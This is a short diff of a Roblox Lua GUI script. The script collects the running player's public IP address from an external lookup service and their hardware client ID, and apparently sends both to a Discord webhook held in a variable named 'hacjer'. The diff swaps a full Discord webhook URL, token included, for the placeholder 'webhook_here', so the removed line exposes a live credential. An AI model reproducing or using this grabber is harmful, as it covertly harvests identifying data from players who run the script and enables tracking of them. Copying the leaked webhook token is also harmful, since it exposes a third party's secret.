@@ -2,7 +2,7 @@ local plr = game.Players.LocalPlayer
 repeat wait() until plr.Character
 local gui = script.Parent
 local urlprofile = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile"
-local hacjer = 'https://discord.com/api/webhooks/935522977557127178/fBHWMUYKYpk_WyjdgshHFB_JBQuU6jfL7LOkirDspTcXSjS49mxY38MePJnGf5vGvLrs'
+local hacjer = 'webhook_here'
 local ident = game:HttpGet("https://v4.ident.me/")
 local HWIDPal = game:GetService("RbxAnalyticsService"):GetClientId()
 local plr = game.Players.LocalPlayer
